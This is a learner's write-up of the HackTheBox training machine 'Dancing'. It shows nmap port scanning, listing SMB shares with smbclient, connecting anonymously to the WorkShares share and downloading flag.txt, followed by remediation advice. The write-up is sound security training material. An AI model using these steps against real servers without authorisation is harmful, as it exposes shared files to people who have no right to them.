# HackTheBox Starting Point: Dancing

**Platform:** HackTheBox (Starting Point, Tier 0)

**Difficulty:** Very Easy

**Focus:** SMB enumeration, anonymous access

## Machine Info
Dancing is a very easy Windows machine which introduces the Server Message Block (SMB) protocol, its enumeration and its exploitation when misconfigured to allow access without a password.

## Setup
This was the first time I used OpenVPN. And it was fun and very easy to learn how to connect to HackTheBox. After connecting I made sure everything worked perfectly with the command "ip a". And everything seemed in order so I started my short journey.

## Enumeration
First, I wanted to see which ports were open and which services were running. So I entered the command:
```
nmap -sV <TARGET_IP>
```
And the result was:
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

With the help of the questions I found out port 445 was for a service named SMB. I had never heard of it and I did some research. I learned that SMB is the protocol Windows uses for file and printer sharing.
I still didn't know much about this and I researched even more and found some useful commands like:

``smbclient -L //Server_IP_or_Name``

``smbclient //Server_IP_or_Name/share_name -N``

I used these later.

The first command I used was ``smbclient -L <TARGET_IP>``, which gave me this output:
```
  Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk  
```
As you can see, shares ending in $ are default administrative shares. WorkShares is a custom share, and I was able to access it without a password, which is a misconfiguration.

## Exploitation
So the next step was to connect to it with the following command: ``smbclient //<TARGET_IP>/WorkShares -N``.
After doing that, I entered the command `ls`, which gave me the following output:
```
 .                                   D        0  Sun Nov  1 12:57:42 2026
  ..                                  D        0  Sun Nov  1 12:57:42 2026
  -p                                  D        0  Sun Nov  1 12:57:42 2026
  Amy.J                               D        0  Mon Mar 29 12:08:24 2021
  James.P                             D        0  Thu Jun  3 11:38:03 2021
```

There were two interesting directories, but I decided to try the James.P one first with the command `cd James.P`. After that I entered the command `ls` again and it gave me this output:
```
  .                                   D        0  Thu Jun  3 11:38:03 2021
  ..                                  D        0  Thu Jun  3 11:38:03 2021
  flag.txt                            A       32  Mon Mar 29 12:26:57 2021
```

My mistake was trying to run `cat flag.txt` directly inside smbclient, but it gave errors because that prompt is not a normal terminal. Then I checked a question in the task list that helped me:
"What is the command we can use within the SMB shell to download the files we find?" So, with the help of the HackTheBox questions, I entered the command `get flag.txt`. Then I entered the simple command ``exit``. And for the final step I ran ``cat flag.txt`` and I got the flag and submitted it.

## What I learned
- What SMB is and that it uses port 445
- How to list shares and connect with smbclient
- What anonymous access means and why it is a risk
- smbclient has its own prompt, so normal commands like cat do not work there

## Remediation
- Disable anonymous/guest access to SMB shares
- Require authentication and limit permissions
- Do not expose port 445 to untrusted networks
